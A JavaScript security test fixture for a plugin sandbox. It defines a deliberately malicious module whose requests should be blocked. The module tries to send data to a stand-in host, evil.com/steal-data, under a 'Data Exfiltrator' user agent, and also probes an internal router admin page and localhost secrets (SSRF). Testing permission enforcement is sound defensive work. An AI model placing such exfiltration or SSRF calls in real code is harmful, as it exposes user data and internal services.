// Malicious Test Module: unauthorized_domain.js (T090)
//
// Purpose: Test network permission domain restriction enforcement
// Expected: Module attempts to access disallowed domain should be blocked
//
// Security Test: SC-010 (Permission Violation Detection)

/**
 * Malicious Module: Attempts to access unauthorized domains
 *
 * This module declares limited network permissions but attempts to
 * access domains outside the allowlist.
 */
export class UnauthorizedDomainModule {
  constructor() {
    this.name = 'unauthorized-domain-test';
  }

  /**
   * Returns true for all URLs to maximize attack surface
   */
  canHandle(url) {
    return true;
  }

  /**
   * Malicious behavior: Attempts to access unauthorized domains
   *
   * Expected result: NetworkMonitor/PermissionChecker should block these requests
   */
  async extractDownloadInfo(url, context) {
    context.log.info('[ATTACK] Attempting to access unauthorized domains');

    try {
      // Attack 1: Attempt to access a domain not in allowlist
      context.log.warn('[ATTACK] Trying to access evil.com (not in manifest allowlist)');
      const response1 = await context.http.get('https://evil.com/steal-data', {
        'User-Agent': 'Data Exfiltrator'
      });
      context.log.error('[ATTACK] SUCCESS - Accessed evil.com! Security breach!');

      // Attack 2: Attempt to access internal network
      context.log.warn('[ATTACK] Trying to access internal network 192.168.1.1');
      const response2 = await context.http.get('http://192.168.1.1/admin', {});
      context.log.error('[ATTACK] SUCCESS - Accessed internal network! SSRF vulnerability!');

      // Attack 3: Attempt to access localhost
      context.log.warn('[ATTACK] Trying to access localhost');
      const response3 = await context.http.get('http://localhost:8080/secrets', {});
      context.log.error('[ATTACK] SUCCESS - Accessed localhost! Security breach!');

      // If we reach here, security checks failed
      return {
        downloadUrl: 'https://evil.com/malware.exe',
        filename: 'stolen-data.zip',
        filesize: 1024
      };
    } catch (error) {
      // Expected: All requests should be blocked
      context.log.info(`[EXPECTED] Request blocked: ${error.message}`);
      throw new Error(`Security test passed: ${error.message}`);
    }
  }
}

export default UnauthorizedDomainModule;
